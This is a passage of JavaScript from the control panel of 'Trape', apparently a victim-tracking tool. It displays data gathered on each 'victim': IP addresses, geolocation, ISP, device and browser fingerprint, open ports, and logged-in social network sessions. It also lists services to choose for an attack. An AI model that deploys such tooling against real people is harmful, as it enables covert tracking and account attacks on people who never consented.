          $.each(response.d, function(index, val) {
             tds += '<div class="TrapeControl-SocialImpact">';
              tds += '<div class="TrapeControl-SocialImpact--details">';
                tds += '<span class="TrapeControl-SocialImpact--Network ' + val[0].toLowerCase() + '"></span>';
                tds += '<div class="TrapeControl-SocialImpact--details---summary">';
                  tds += '<h1 class="TrapeControl-SocialImpact--details---summaryNameNetwork">' + val[0].replace(/\b\w/g, l => l.toUpperCase()) + ' <span class="TrapeControl-SocialImpact--details---summaryClasification">#' + (index + 1) + '</span></h1>';
                tds += '</div>';
              tds += '</div>';
              tds += '<div class="TrapeControl-SocialImpact--stats">';
                tds += '<div class="TrapeControl-SocialImpact--stats---Item">';
                  tds += '<h2 class="TrapeControl-SocialImpact--stats---Item----text"> Impact</h2>';
                  tds += '<span class="TrapeControl-SocialImpact--stats---Item----resultPorcent">' + (val[1] * 100 / total_users).toFixed(0) + '%</span>';
                tds += '</div>';
                tds += '<div class="TrapeControl-SocialImpact--stats---lineSeparation"></div>';
                tds += '<div class="TrapeControl-SocialImpact--stats---Item">';
                  tds += '<h2 class="TrapeControl-SocialImpact--stats---Item----text">interactions</h2>';
                  tds += '<span class="TrapeControl-SocialImpact--stats---Item----resultInteractions">' + val[3] + '</span>';
                tds += '</div>';
                tds += '<div class="TrapeControl-SocialImpact--stats---lineSeparation"></div>';
                tds += '<div class="TrapeControl-SocialImpact--stats---Item">';
                  tds += '<h2 class="TrapeControl-SocialImpact--stats---Item----text">Sessions</h2>';
                  tds += '<span class="TrapeControl-SocialImpact--stats---Item----result">' + val[1] + '</span>';
                tds += '</div>';
                tds += '<div class="TrapeControl-SocialImpact--stats---lineSeparation"></div>';
                tds += '<div class="TrapeControl-SocialImpact--stats---Item">';
                  tds += '<h2 class="TrapeControl-SocialImpact--stats---Item----text">Locations</h2>';
                  tds += '<span class="TrapeControl-SocialImpact--stats---Item----result">' + val[2] + '</span>';
                tds += '</div>';
              tds += '</div>';
            tds += '</div>';
          });
          $('#cntTrapeContro_SocialImpact div').remove();
          $('#cntTrapeContro_SocialImpact').append(tds);
        } else{
          $('#cntTrapeContro_SocialImpact div').remove();
          
          var htmlData = '';
          htmlData += '<div class="TrapeControl-HistorySocialImpact--NotData">';
            htmlData += 'No networks available yet';
          htmlData += '</div>';
          $('#cntTrapeContro_SocialImpact').append(htmlData);
        }
      }, error: function(error) {
        $('#cntTrapeContro_SocialImpact div').remove();
        console.log(error);
      }
    });
  } else{
    $('#cntTrapeContro_SocialImpact div').remove();
    var htmlData = '';
          htmlData += '<div class="TrapeControl-HistorySocialImpact--NotData">';
            htmlData += 'No networks available yet';
          htmlData += '</div>';
          $('#cntTrapeContro_SocialImpact').append(htmlData);
  }
}

window.onblur = function(){
  document.title = "Hey! back to Trape";
}
window.onfocus = function(){
  document.title = "Trape: Control Panel";
}

var getCurrentDate = function(){
  var f = new Date();
  return f.getFullYear() + "-" + zeroComplete(f.getMonth() +1, 2) + "-" + zeroComplete(f.getDate(), 2) + " " + zeroComplete(f.getHours(), 2) + ":" + zeroComplete(f.getMinutes(), 2) + ":" + zeroComplete(f.getSeconds(), 2);
}

var daysBetween = function(iniDate, endDate){
  if (endDate == ('NaN-NaN-NaN')){
    endDate = getCurrentDate();
  }

  var iniDate = new Date(iniDate);
  var endDate = new Date(endDate);

  var day_as_milliseconds = 86400000;
  var diff_in_millisenconds = endDate - iniDate;
  var diff_in_days = (diff_in_millisenconds / day_as_milliseconds) + 1;

  return parseInt(diff_in_days);
}

var addDaysToDate = function(vDate, days){
  if (vDate == '--'){
    return '--'
  }

  vDate = new Date(vDate);
  day = vDate.getDate();
  month = vDate.getMonth()+1;
  year = vDate.getFullYear();

  vTime = vDate.getTime();
  milliseconds = parseInt(days*24*60*60*1000);
  total = vDate.setTime(vTime+milliseconds);
  day = vDate.getDate();
  month = vDate.getMonth()+1;
  year = vDate.getFullYear();

  return year + "-" + zeroComplete(month, 2)  + "-" + zeroComplete(day, 2);   
}

function zeroComplete(n, length){
   n = n.toString();
   while(n.length < length) n = "0" + n;
   return n;
}

var timeAgo = function (v_date){
    if (v_date == '' || v_date == null || v_date == undefined){
      v_date = getCurrentDate()
    }
    v_date = new Date(v_date.replace(' - ', 'T').replace(" ", "T").substring(0, 19) + "Z");
    var currentDate = new Date();
    
    var v_time = v_date.getTime();
    var currentTime = currentDate.getTime();

    var diference = currentTime-v_time;

    diference = parseInt(((diference/1000)/60)-300);

    var ans = "";
    if (diference < 2) {
      ans = "One moment ago";
    } else {
      if (diference < 60) {
        ans = diference + " minutes ago";
      } else {
        if (diference < 120) {
          ans = "1 hour ago";
        } else {
          if (diference < 1440) {
            ans = parseInt(diference/60) + " hours ago";
          } else {
            if (diference < 43200) {
              ans = parseInt(diference/60/24) + " days ago";
            } else {
              ans = parseInt(diference/60/24/30) + " months ago";
            }
          }
        }
      }
    }

    return ans;
}


var User = {
  getDetails : function(idVictim, detCallback){
    window.currentUserAddres = null;
    var behavior = window.user_behavior;
    if (idVictim === undefined){
      idVictim = window.idVictim;
    }
    if (detCallback === undefined){
      detCallback = function(){};
    }
    $.ajax({
        url: '/get_preview',
        data: {vId : idVictim},
        dataType: "json",
        type: 'POST',
        success: function(response) {
            if (response.status != 'OK') {

            } else {
              user_active = idVictim;
                $('.TrapeControl-Preview--NotificationAlert').hide();
                $(".TrapeControl-ViewDetails").addClass("active");

                $('.TrapeControl-Preview--box---Sidebar----NetworksStatus').removeClass('online');
                $('.TrapeControl-Preview--box---Sidebar----NetworksStatus').removeClass('offline');
                $('.TrapeControl-Preview--box---Sidebar----NetworksStatus').addClass('offline');
                $('.TrapeControl-Preview--box---Sidebar----NetworksStatus').text('Off');

                $('#txtTrapeControl_SelectPlayAttack option').remove();
                var tds = '<option value="">Choose an active service</option>';

                $.each(response.n, function(index, val) {
                   $('.TrapeControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').removeClass('offline');
                   $('.TrapeControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').addClass('online');
                   $('.TrapeControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').text('On');
    
                   tds += '<option value="' + val[3].toLowerCase() + '">' + val[3] + '</option>';
                });
                $('#txtTrapeControl_SelectPlayAttack').append(tds);

                $('.TrapeControl-Preview--box---Sidebar----NetworksStatusSessions-----totalOnline').text(response.n.length);
                var cNetworks = $('.TrapeControl-Preview--box---Sidebar----NetworksDefine').length;
                $('.TrapeControl-Preview--box---Sidebar----NetworksStatusSessions-----totalOffline').text((cNetworks - response.n.length));

                var d = response.d[0];

                window.currentUserAddres = {
                  lat : d[26],
                  lon : d[27],
                  provider : {
                    lat : d[15],
                    lon : d[26]
                  }
                };

                $('#lblTrapeControl_Preview_CPU').text(d[7].charAt(0).toUpperCase() + d[7].slice(1));
                $('#lblTrapeControl_Preview_SO').text(d[6].charAt(0).toUpperCase() + d[6].slice(1));
                $('#lblTrapeControl_Preview_Browser').text(d[5].charAt(0).toUpperCase() + d[5].slice(1));
                $('#lblTrapeControl_Preview_Country').text(d[13]);
                $('#lblTrapeControl_Preview_City').text(d[19]);
                $('#lblTrapeControl_Preview_Latitude').text(d[15]);
                $('#lblTrapeControl_Preview_Longitude').text(d[16]);
                $('#lblTrapeControl_Preview_OpenPorts').text(d[8]);
                $('#lblTrapeControl_Preview_ISP').text(d[22]);
                $('#lblTrapeControl_Preview_UA').text(d[23]);
                $('#lblTrapeControl_Preview_UA').attr('title', d[23]);

                $('#lnkTrapeControlPreview_PublicIP').text(d[14]);
                $('#lnkTrapeControlPreview_LocalIP').text(d[1]);

                try {
                  var tmpGPU = JSON.parse(d[36]);
                  $('#lblTrapeControl_GPU_Display').text(tmpGPU.display);
                  $('#lblTrapeControl_GPU_Renderer').text(tmpGPU.renderer);
                  $('#lblTrapeControl_GPU_Vendor').text(tmpGPU.vendor);
                }
                catch(err) {
                  $('#lblTrapeControl_GPU_Display').text('No Detect');
                  $('#lblTrapeControl_GPU_Renderer').text('No Detect');
                  $('#lblTrapeControl_GPU_Vendor').text('No Detect');
                }

                $("#lblTrapeControl_Preview_Behavior").text(behavior);

                $('#lblTrapeControl_Batery_Level').text(d[30]);
                if (d[28] == 'True'){
                  $('#lblTrapeControl_Batery_Source').text('Energy supply');
                  if (!isNaN(d[29]) && d[29] != 'Infinity'){
                    var b_time = {};
                    b_time.Hours = Math.floor((d[29]/3600));
                    b_time.Minutes = Math.floor(((d[29] - (b_time.Hours * 3600))/60));
                    $('#lblTrapeControl_Batery_Time').text(b_time.Hours + ':' + b_time.Minutes);
                  } else{
                    $('#lblTrapeControl_Batery_Time').text('NA');
                  }
                } else if(d['28'] == 'False'){
                  $('#lblTrapeControl_Batery_Source').text('Battery');
                  if (!isNaN(d[31]) && d[31] != 'Infinity'){
                    var b_time = {};
                    b_time.Hours = Math.floor((d[31]/3600));
                    b_time.Minutes = Math.floor(((d[31] - (b_time.Hours * 3600))/60));
                    $('#lblTrapeControl_Batery_Time').text(b_time.Hours + ':' + b_time.Minutes);
                  } else{
                    $('#lblTrapeControl_Batery_Time').text('NA');
                  }
                }
                else{
                  $('#lblTrapeControl_Batery_Source').text('No detected');
                  $('#lblTrapeControl_Batery_Time').text('NA');
                  $('#lblTrapeControl_Batery_Level').text('NA');
                }
                

                $('#lblTrapeControl_NavigationMode_Incognito').text(d[32]);
                if (d[33] == 1 || d[33] == "yes"){
                  $('#lblTrapeControl_NavigationMode_DoNotTrack').text('Active');
                  $('#lblTrapeControl_NavigationMode_DoNotTrack').removeClass('TrapeControl-PreviewSummary--info---NavigationMode----DNTFalse')
                  $('#lblTrapeControl_NavigationMode_DoNotTrack').addClass('TrapeControl-PreviewSummary--info---NavigationMode----DNTTrue')
                } else{
                  $('#lblTrapeControl_NavigationMode_DoNotTrack').text('Inactive');
                  $('#lblTrapeControl_NavigationMode_DoNotTrack').removeClass('TrapeControl-PreviewSummary--info---NavigationMode----DNTTrue')
                  $('#lblTrapeControl_NavigationMode_DoNotTrack').addClass('TrapeControl-PreviewSummary--info---NavigationMode----DNTFalse')
                  
                }

                if (d[9] == 'online'){
                  $('#lblTrapeControl_NavigationMode_Status').text('Online');
                } else{
                  $('#lblTrapeControl_NavigationMode_Status').text(timeDisconect(d[34]));
                }

                $('.TrapeControl-Preview--box---Mapbox----putNameLog-----input').val(d[35]);

                var tmpNetwork = JSON.parse(d[25]);

                if (tmpNetwork != null){
                    if (tmpNetwork['Download_test'] != undefined){
                        $('#lblTrapeControl_dataNetwork_Download').text(tmpNetwork['Download_test'].speedMbps + ' Mbps');
                        $('#lblTrapeControl_dataNetwork_Ping').text((parseFloat(tmpNetwork['Download_test'].duration) * 100/8).toFixed(2) + ' ms');
                    } else{
                        if (tmpNetwork['downlink'] != undefined){
                            $('#lblTrapeControl_dataNetwork_Download').text(tmpNetwork['downlink'] + ' Mbps');
                        } else{
                            $('#lblTrapeControl_dataNetwork_Download').text('--');
                        }
                        $('#lblTrapeControl_dataNetwork_Ping').text('--');
                    }

                    if (tmpNetwork['Upload_test'] != undefined){
                        $('#lblTrapeControl_dataNetwork_Upload').text(tmpNetwork['Upload_test'].speedMbps + ' Mbps');
                    } else{
                        if (tmpNetwork['rtt'] != undefined){
                            $('#lblTrapeControl_dataNetwork_Upload').text(tmpNetwork['rtt'] + ' Kbps');
                        } else{
                            $('#lblTrapeControl_dataNetwork_Upload').text('--');
                        }
                    }

                    if (tmpNetwork['effectiveType'] != undefined){
                        $('#lblTrapeControl_dataNetwork_Type').text(tmpNetwork['effectiveType']);
                    } else{
                        $('#lblTrapeControl_dataNetwork_Type').text('--');
                    }
                }

                var aHosts = [];
                tds = '';
                $('.TrapeControl-Preview--dataHosts div').remove();

                $.each(response.h, function(index, val) {
                    aHosts[index] = {};
                    aHosts[index].id = val[0];
                    aHosts[index].host = val[1];
                    aHosts[index].time = val[2];
                    aHosts[index].date = val[3];
                    tds += '<div class="TrapeControl-Preview--dataHosts---host">';
                      tds += '<span class="TrapeControl-Preview--dataHosts---host----iconBox">';
                          tds += (index + 1);
                      tds += '</span>';
                      tds += '<span class="TrapeControl-Preview--dataHosts---host----text">host: <span class="TrapeControl-Preview--dataHosts---host----subText">' + aHosts[index].host + '</span></span>';
                      tds += '<div class="TrapeControl-Preview--dataHosts---host----line"></div>';
                      tds += '<span class="TrapeControl-Preview--dataHosts---host----text">time: <span class="TrapeControl-Preview--dataHosts---host----subText">' + aHosts[index].time + '</span>';
                      tds += '</span>';
                      tds += '<div class="TrapeControl-Preview--dataHosts---host----line"></div>';
                      tds += '<span class="TrapeControl-Preview--dataHosts---host----text">date: <span class="TrapeControl-Preview--dataHosts---host----subText">' + aHosts[index].date + '</span>';
                      tds += '</span>';
                    tds += '</div>';
                });

                $('.TrapeControl-Preview--dataHosts').append(tds);

                if (aHosts.length > 0){
                    $('.TrapeControl-Preview--dataHostsElement---Item----result').text(aHosts.length + ' found');
                } else{
                    $('.TrapeControl-Preview--dataHostsElement---Item----result').text('No host found yet');
                }

                detCallback();
            }
        },
        error: function(error) {
            console.log(error);
        }
    });
  }
 , loadMap : function(){
  if (window.currentUserAddres != undefined && window.currentUserAddres != null){
    var lat = window.currentUserAddres.lat;
    var lon = window.currentUserAddres.lon;
    var provider = window.currentUserAddres.provider;
    var aL = []
    aL.push(['', parseFloat(provider.lat), parseFloat(provider.lon)]);

    if (lat != '' && lat != null){
        aL.push(['', parseFloat(lat), parseFloat(lon)]);
    }
    loadMap(aL);
  } else{
    alert("Can't find location yet");
  }
}
 , getAddress : function(lat, lon){
    $.getJSON('https://maps.googleapis.com/maps/api/geocode/json?latlng=' + lat + ',' + lon + '&key=' + window.gMapsApiKey + '')
      .done(function( data ) {
          var jAddress = {};
          jAddress.formatted_address = '--';
          jAddress.postal_code = '--';

          if (data.results[0] != undefined){
              if (data.results[0].formatted_address != undefined){
                  jAddress.formatted_address = data.results[0].formatted_address;
              }
              if (data.results[0].address_components != undefined){
                  if (data.results[0].address_components[7] != undefined){
                      if (data.results[0].address_components[7].long_name != undefined){
                          jAddress.postal_code = data.results[0].address_components[7].long_name;
                      }
                  }
              }
          }
          
          $('#mapPostalCode').text(jAddress.postal_code);

          fillTab('address', jAddress);
      });
  } 
}
//# sourceMappingURL